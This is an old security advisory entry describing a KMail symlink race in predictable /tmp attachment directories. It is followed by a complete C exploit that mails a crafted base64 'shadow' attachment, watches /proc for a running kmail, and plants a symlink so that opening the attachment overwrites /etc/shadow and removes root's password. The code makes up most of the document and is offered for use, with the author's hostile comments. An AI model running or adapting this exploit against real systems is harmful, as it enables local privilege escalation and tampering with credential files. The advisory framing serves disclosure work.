source: http://www.securityfocus.com/bid/300/info

KMail is a mail user agent that comes with the kdenetwork package, part of the K Desktop Environment. A vulnerability in the way KMail creates temporary files to save attachments may allow malicious users to overwrite any file that user running KMail has permissions to.

When viewing messages with attachments KMail creates a directory under /tmp in which to store the attachments with a predictable name of the form "kmail<pid of kmail>". KMail fails to verify whether the directory exists and follows symbolic links. This allows local attackers to create or overwrite files with contents they can select in any directory and/or file writable by the user running KMail.

/*

KDE, kmail local email-attachment symlink exploit - possible root comprimise.

Discovered/coded by: DiGiT - teddi@linux.is

This sploit simply sends an email to somedude@somehost with an attachment on it
that contains a fixed 'shadow' file that set's no password for root, change
that if you need to.

It then scans /proc for a kmail process and when a kmail process starts it
will create /tmp/kmail`pidof kmail` and therein the dir part2 and a symlink
to /etc/shadow.

Then when root or whatever checks his mail the attachment, get's written over
/etc/shadow, setting it so that root has no password so u can su - to get root
privs. (Note: some probs with this because it writes the contents of 'shadow'
attachment directly onto the shadow file itself, and might not erase the line
completly, i'l fix this, later)

Run this sploit with nohup or screen or smt.

Greets, #hax (ircnet!)
special greets, p0rtal(transmit, etc), icemav, cookie, crazy-b.

ps: Visit haxforce rc5 cracking team! http://haxforce.security.eu.org :>
if you have serious CPU power, join us#%# :>

ps ps: Besides that fact I am very angry atm, and not very happy with life,
I'd like to note that this kmail crap is UNBELIVABLE buggy and this bug is
only an example of multiple bugs that exist within kmail code, possible remote
comprise is also a possibility but, I hate everything so I wont go into that
atm.
  
- DiGiT

*/

#include <stdio.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdarg.h>

#define DELAY 1 // secs, watch it here..

void scan_processes();
void find_processes();

char username[20];
char hostname[256];
char sockbuff[2048];

static int sockfd;
struct sockaddr_in in_addr;

void transmit(char *format, ...)
{
   va_list va;

   va_start (va, format);
   vsnprintf (sockbuff, sizeof(sockbuff), format, va);
   va_end (va);
   strcat (sockbuff, "\r\n");

   if ( (write (sockfd, sockbuff, strlen(sockbuff))) < 0)
   {
      fprintf (stderr, "ERROR: Could not WRITE to socket %d!", sockfd);
      exit(4);
   }
   memset (sockbuff, '\0', sizeof(sockbuff));

}

void create_dirs(char *directory) {

        char filename[1024];
  

        printf("creating dir & symlink..\n");
  
   snprintf (filename, sizeof(filename)-1, "/tmp/kmail%s", directory);

                mkdir(filename, 0777);
                chdir(filename);
                mkdir("part2", 0777);
                chdir("part2");

                        symlink("/etc/shadow", "shadow");

                exit(0);

        }



void send_mail()        {

        struct hostent *he;

        if ((he=gethostbyname(hostname)) == NULL) {
            herror("gethostbyname");
            exit(1);
        }

        in_addr.sin_family = AF_INET;
        in_addr.sin_port = htons(25);
        in_addr.sin_addr = *((struct in_addr *)he->h_addr);
        bzero(&(in_addr.sin_zero), 8);
   
        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
                perror("socket");
                exit(0);
        }
   
        if(connect(sockfd, (struct sockaddr *)&in_addr, sizeof(in_addr)) < 0){
                perror("connect");
                exit(0);
        }
   
    transmit ("EHLO www.microsoft.com");
    transmit ("MAIL FROM: wanker@www.microsoft.com");
    transmit ("RCPT TO: %s@%s", username, hostname);
    transmit ("DATA");

    transmit ("From: <wanker@www.microsoft.com>");
    transmit ("X-Sender: root@killer");
    transmit ("To: %s@%s", username, hostname);
    transmit ("Subject: test");
    transmit ("Message-ID: <kmail.9905122356390.190-200000@killer>");
    transmit ("MIME-Version: 1.0");
    transmit ("Content-Type: MULTIPART/MIXED; BOUNDARY=\"0-821493994-926553406=:190\"");
    transmit (""); //blah :>
    transmit ("  This message is in MIME format.  The first part should be readable text,");
    transmit ("  while the remaining parts are likely unreadable without MIME-aware tools.");
    transmit ("  Send mail to mime@docserver.cac.washington.edu for more info.");
    transmit ("");
    transmit ("--0-821493994-926553406=:190");
    transmit ("Content-Type: TEXT/PLAIN; charset=US-ASCII");
    transmit ("\n"); //three
    transmit ("--0-821493994-926553406=:190");
    transmit ("Content-Type: TEXT/PLAIN; charset=US-ASCII; name=shadow");
    transmit ("Content-Transfer-Encoding: BASE64");
    transmit ("Content-ID: <kmail.9905122356460.190@killer>");
    transmit ("Content-Description:");
    transmit ("Content-Disposition: attachment; filename=shadow");
    transmit ("");
    transmit ("cm9vdDo6MTA2OTU6MDo6Ojo6"); // this needs work.. I hate all.
    transmit ("--0-821493994-926553406=:190--");
    transmit (".");
    transmit ("QUIT");
                printf("sent the data.. find the process..\n");
                find_processes();
}
   
        
 void  find_processes() {
                
           struct dirent **namelist;
           int n;
        
 while(1) {
                
           n = scandir("/proc", &namelist, 0, alphasort);
   
           if (n < 0)
               perror("scandir");
          else
    
        sleep(DELAY);
    
        while(n--) scan_processes(namelist[n]->d_name);

        }
}
    
void scan_processes(char *dir) {

                struct stat fbuf;
                char buffer[1024];
                char buffer2[1024];
                FILE  *fd;

   memset (buffer2, '\0', sizeof(buffer2));
   snprintf (buffer2, sizeof(buffer2), "/proc/%s", dir);

                if(chdir(buffer2) == -1)
                        return ;

        if(stat("cmdline", &fbuf) == -1)
                        return ;

        fd = fopen("cmdline", "r");

    
        fgets(buffer, sizeof(buffer), fd);
    
                if(!strncmp(buffer, "kmail", sizeof(buffer)) > 0) {

                        printf("Yay! Found Kmail process #%s\n", dir);
                        printf("Lets set up the proper symlinks etc.\n");
                
                create_dirs(dir);
        }
        
        else
                
                fclose(fd);
   
                return;
 
                
           
}  
           
int main(char argc, char *argv[])       {
              
if(argc < 2) {
        fprintf(stderr, "\n[Kde Kmail email-attachment symlink race exploit, by DiGiT - teddi@linux.is]\n");
        fprintf(stderr, "[Syntax is: %s user host : ie %s root theboxyouron.com]\n", argv[0], argv[0]);
        fprintf(stderr, "[Make sure you hit the right email address]\n\n");
 
                        exit(0);
                }

                
        strncpy(username, argv[1], sizeof(username));
        strncpy(hostname, argv[2], sizeof(hostname));
                
                printf("starting the attack...\n");
   
                        send_mail();
        }
